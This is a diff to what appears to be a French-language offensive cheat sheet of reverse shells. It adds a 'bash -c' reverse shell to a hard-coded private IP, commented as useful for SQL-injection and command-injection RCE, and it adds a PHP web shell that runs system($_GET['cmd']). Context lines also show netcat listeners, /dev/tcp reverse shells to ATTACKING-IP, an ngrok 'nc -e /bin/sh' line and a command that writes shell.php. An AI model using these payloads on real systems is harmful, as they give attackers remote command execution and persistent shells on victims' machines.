@@ -17,11 +17,13 @@
 ### Basics / Classical
 
 ```bash
-157.90.29.76
-
 nc -nlvp 443
 bash -i >& /dev/tcp/ATTACKING-IP/443 0>&1
-nc -nlvp 443
+
+# variante bash -c — utile pour injection (SQLi RCE, commande système, etc.)
+bash -c "bash -i >& /dev/tcp/192.168.45.198/4444 0>&1"
+
+# via point-virgule (injection dans un paramètre)
 127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKING-IP/443 0>&1'
 ```
 
@@ -49,6 +51,7 @@ nc 0.tcp.ngrok.io <port> -e /bin/sh
 
 ```php
 <?php system($_GET['cmd']); ?>
+<?php echo system($_GET['cmd']); ?>     // avec echo — affiche aussi le retour
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 
